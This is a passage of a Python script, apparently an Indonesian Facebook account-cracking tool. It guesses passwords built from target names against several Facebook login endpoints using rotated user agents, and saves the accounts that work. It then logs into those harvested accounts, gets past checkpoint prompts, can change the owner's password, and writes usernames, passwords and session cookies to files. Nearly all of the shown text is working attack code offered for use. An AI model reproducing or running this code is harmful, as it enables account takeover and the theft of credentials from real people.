	with tred(max_workers=25) as pool:
		for AangXD in id2:
			idf,__cans__ = AangXD.split('|')[0],AangXD.split('|')[1].lower()
			__kiya__ = __cans__.split(' ')[0]
			__Ang__ = []
			if len(__cans__)<6:
				if len(__kiya__)<3:
					pass
				else:
					__Ang__.append(__kiya__+'123')
					__Ang__.append(__kiya__+'1234')
					__Ang__.append(__kiya__+'12345')
			else:
				if len(__kiya__)<3:
					__Ang__.append(__cans__)
				else:
					__Ang__.append(__cans__)
					__Ang__.append(__kiya__+'123')
					__Ang__.append(__kiya__+'1234')
					__Ang__.append(__kiya__+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					__Ang__.append(xpwd)
			else:pass
			if 'mbasic' in method:pool.submit(__validate__,idf,__Ang__,'mbasic.facebook.com')
			elif 'free' in method:pool.submit(__validate__,idf,__Ang__,'free.facebook.com')
			elif 'mobile' in method:pool.submit(__validate__,idf,__Ang__,'m.facebook.com')
			elif 'mbasic_v2' in method:pool.submit(__regular__,idf,__Ang__,'mbasic.facebook.com')
			elif 'free_v2' in method:pool.submit(__regular__,idf,__Ang__,'free.facebook.com')
			elif 'mobile_v2' in method:pool.submit(__regular__,idf,__Ang__,'m.facebook.com')
			else:pool.submit(__validate__,idf,__Ang__,'m.facebook.com')
	print(f"\n")
	sel = f"""{P2}[{H2}!{P2}] Sukses crack dari {H2}{str(len(id))}{P2}
[{O2}•{P2}] Total akun {H2}OK:{ok}{P2}
[{O2}•{P2}] Total akun {K2}CP:{cp}{P2}"""
	Buat(Anak(sel,width=50,style=f"{U3}"))
	sound("selesai")
########## INFORMASI ##########
def __ingfo__():
	bck = f"""{P2}Saran kartu :
  └─── {H2}Axis{P2}
  └─── {H2}Telkomsel{P2}
  └─── {H2}Indosat{P2}
  └─── {H2}Three{P2}

{P2}Wifi :
  └─── {H2}Crack bisa juga menggunakan wifi, tetapi rawan spam ip karena device wifi/hotspot tidak berubah seperti data seluler

{P2}Sosial media :
  └─── {H2}Fb : facebook.com/Aang.Qwerty69{P2}
  └─── {H2}Gh : github.com/AngCyber{P2}
  └─── {H2}Ig : instagram.com/Aangxd.Qwerty_{P2}

{P2}Donasi :
  └─── {H2}Dana  : 083177721763{P2}
  └─── {H2}Pulsa : 085600457223{P2}"""
	Buat(Anak(bck,width=50,title=f"{H2}informasi{P2}",style=f"{U3}"))
########## USER AGENT CADANGAN ##########
Ran = random.choice(["8","9","10","11","12"])
Ran3 = random.randrange(111,999)
Ran4 = random.randrange(11111,19999)
Ran5 = random.randrange(111111,199999)
XX = f"Mozilla/5.0 (Windows Phone 10.0; Android {Ran}; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
YY = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0"
ZZ = f"Mozilla/5.0 (Linux; Android {Ran}; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.58 Mobile Safari/537.36 EdgA/100.0.1185.50"
set_ua2 = random.choice([XX,YY,ZZ])

Ran = random.choice(["8","9","10","11","12"])
Ran3 = random.randrange(111,999)
Ran4 = random.randrange(11111,19999)
Ran5 = random.randrange(111111,199999)
UG1 = f"Mozilla/5.0 (X11; U; Linux x86_64; en-CA) AppleWebKit/534.35 (KHTML, like Gecko) Chrome/11.0.696.65 Safari/534.35 Puffin/3.10623IP"
UG2 = f"Mozilla/5.0 (Linux; Android {Ran}; Redmi Note 8 Pro Build/RP1A.{Ran3}.{Ran5};) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.70 Mobile Safari/537.36"
UG3 = f"Treo800w/v0100 Mozilla/4.0 (compatible; MSIE {Ran}; Windows CE, PPC; 320x320) (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)"
set_ua3 = random.choice([UG1,UG2,UG3])

Ran = random.choice(["8","9","10","11","12"])
Ran3 = random.randrange(111,999)
Ran4 = random.randrange(11111,19999)
Ran5 = random.randrange(111111,199999)
QQ = f"Mozilla/5.0 (Android {Ran}; Mobile; Google Pixel 6 Pro; rv:106.0) Gecko/106.0 Firefox/106.0"
RR = f"Mozilla/5.0 (Windows Phone 10.0; Android {Ran}; Microsoft; Lumia 650 Dual SIM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254"
SS = f"Mozilla/5.0 (Windows Phone 10.0; Android {Ran}; NOKIA; Lumia 1520) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.0.0 Mobile Safari/537.36 Edge/44.0.0.0.0"
set_ua4 = random.choice([QQ,RR,SS])
########## CHECK USER ##########
def __check__():
	__result__ = os.listdir("CP")
	CP = ("CP/")
	sss = f"{P2}check opsi akun facebook checkpoin"
	Buat(Anak(sss,width=50,style=f"{U3}"))
	for file in __result__:
		print(f"  {P}[{M}•{P}] {file}");time.sleep(0.03)
	__janda__ = input(f"\n  {P}[{H}?{P}] Masukan nama file : ")
	if __janda__ == [""]:
		print(f"\n  {P}[{M}!{P}] Pilih yang bener anjeng")
		__check__()
	try:
		file_cp = open(CP+__janda__, "r").readlines()
	except IOError:
		print(f"\n  {P}[{M}!{P}] File ndak ada goblok");exit()
	mode = f"{P2}Mode pesawatkan 3 detik dulu sebelum mulai"
	Buat(Anak(mode,width=50,style=f"{U3}"));time.sleep(2)
	pw = input(f"  {P}[{H}?{P}] Ganti password ketika tap crot [{H}y{P}/{M}t{P}]: ")
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input(f"  {P}[{H}?{P}] Masukan password baru : ")
		if len(pw2) <= 5:
			print(f"\n  {P}[{M}!{P}] Sandi minimal {H}6{P} karakter goblok")
		else:
			pwbaru.append(pw2)
	tot = f"{P2}Jumlah akun yang tersimpan adalah {H2}{str(len(file_cp))}{P2} akun"
	Buat(Anak(tot,width=50,style=f"{U3}"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print(f"\n  {P}[{H}{nomor}{P}] Check login : {K}%s{P}"%(akun.replace(" *--> ","")))
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	sel = f"{P2}Proses pengecekan opsi akun selesai ..."
	Buat(Anak(sel,width=50,style=f"{U3}"));time.sleep(1)
	exit()
########## CHECK OPSI CHECKPOIN ##########
def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print(f"   {P}└── Akun terkena sesi kunci")
		else:
			print(f"   {P}└── {H}Akun tap crot, silahkan login di lite{P}")
			open('OK/OK-%s.txt'%(cepe), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=[
			'lsd',
				'fb_dtsg',
					'jazoest',
				'checkpoint_data',
			'submit[Continue]',
				'nh'
			]
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print(f"\r   {P}└── Ditemukan {H}{str(len(cek))}{P} opsi akun")
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=[
						"submit[Yes]",
							"nh",
								"lsd",
							"fb_dtsg",
									"jazoest",
							"checkpoint_data"
						]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","lsd","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print(f"   {P}└── {H}Akun tap crot, password berhasil diganti{P}\n   └── {H}%s|%s|%s{P}"%(user,pwbaru[0],coki))
						open('TAP-CROT/%s' %(tapp), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
				else:
					print("   {P}└── {H}Akun tap crot, silahkan login di lite{P}")
					open('OK/OK-%s.txt' %(cepe), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print(f"\r   {P}└── Akun terpasang autentikasi 2 faktor :(")
			else:
				print(f"\r   {P}└── Terjadi kesalahan pada akun")
		else:
			if "c_user" in session.cookies.get_dict():
				print(f"   {P}└── {H}Akun tap crot, silahkan login di lite{P}")
				open('TAP-CROT/%s' %(tapp), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			print(f"   {P}└── {H}{number}{P}. %s"%(cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(f"   {P}└── {oh}")
	else:
		print(f"   {P}└── kata sandi salah/sudah diubah")
########## PROGRAM DONE ##########
if __name__=='__main__':
	login()